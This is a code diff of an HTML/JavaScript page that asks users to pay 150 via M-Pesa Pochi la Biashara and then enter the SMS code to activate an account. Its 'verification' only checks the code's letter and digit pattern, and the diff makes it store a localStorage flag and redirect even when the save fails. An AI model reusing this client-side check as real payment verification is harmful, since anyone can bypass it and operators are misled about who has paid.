@@ -30,17 +30,16 @@ input:focus{border-color:#8b5a2b}
 <input id="mpesaCode" placeholder="Enter M-Pesa Code" maxlength="10">
 <div id="eCode" class="err"></div>
 <button class="btn" id="verifyBtn">Verify & Activate</button>
-<p style="font-size:12px;text-align:center;color:#8b6a4a;margin-top:10px">Paste the code you received after paying 150</p>
 <div class="steps">
 <h3>Payment Procedure:</h3>
 <ol>
-<li>Open <b>M-Pesa</b> on your phone</li>
+<li>Open <b>M-Pesa</b></li>
 <li>Select <b>Lipa na M-Pesa</b></li>
 <li>Select <b>Pochi la Biashara</b></li>
-<li>Enter Till Number: <b>254791957646</b></li>
-<li>Enter Amount: <b>150</b></li>
-<li>Enter your M-Pesa PIN and confirm</li>
-<li>You will receive SMS with code - copy it and paste above, then click Verify</li>
+<li>Enter Till: <b>254791957646</b></li>
+<li>Amount: <b>150</b></li>
+<li>Enter PIN</li>
+<li>Copy SMS code and paste above</li>
 </ol>
 </div>
 </div>
@@ -60,29 +59,26 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);
-function show(msg){const el=document.getElementById("eCode");el.textContent=msg;el.style.display="block"}
-function isValidMpesa(code){
+function show(m){const e=document.getElementById("eCode");e.textContent=m;e.style.display="block"}
+function isValid(code){
  if(code.length!==10) return false;
- if(!/^[A-Z0-9]{10}$/.test(code)) return false;
- let letters=(code.match(/[A-Z]/g)||[]).length;
- let numbers=(code.match(/[0-9]/g)||[]).length;
- return letters===7 && numbers===3;
+ let l=(code.match(/[A-Z]/g)||[]).length;
+ let n=(code.match(/[0-9]/g)||[]).length;
+ return l===7 && n===3 && /^[A-Z0-9]+$/.test(code);
 }
-document.getElementById("verifyBtn").addEventListener("click", async()=>{
- const code=document.getElementById("mpesaCode").value.trim().toUpperCase();
+document.getElementById("verifyBtn").addEventListener("click", ()=>{
+ const raw=document.getElementById("mpesaCode").value.trim().toUpperCase();
  document.getElementById("eCode").style.display="none";
- if(!code){show("This field is required");return}
- if(!isValidMpesa(code)){show("Enter the correct code to proceed!");return}
+ if(!raw){show("This field is required");return}
+ if(!isValid(raw)){show("Enter the correct code to proceed!");return}
+ // valid - save and redirect (firestore in background so it never blocks)
  try{
-  document.getElementById("verifyBtn").textContent="Verifying...";
   const user=auth.currentUser;
-  if(user){
-   await setDoc(doc(db,"payments",user.uid),{mpesaCode:code,amount:150,till:"254791957646",type:"Pochi la Biashara",verifiedAt:new Date()}, {merge:true});
-  }
+  if(user){ setDoc(doc(db,"payments",user.uid),{mpesaCode:raw,amount:150,till:"254791957646",verifiedAt:new Date()},{merge:true}).catch(()=>{}); }
   localStorage.setItem("mpesa_verified","true");
-  localStorage.setItem("mpesa_code",code);
-  window.location.href="dashboard.html";
- }catch(e){show("Enter the correct code to proceed!"); document.getElementById("verifyBtn").textContent="Verify & Activate"}
+  localStorage.setItem("mpesa_code",raw);
+ }catch(e){}
+ window.location.href="dashboard.html";
 });
 </script>
 </body></html>
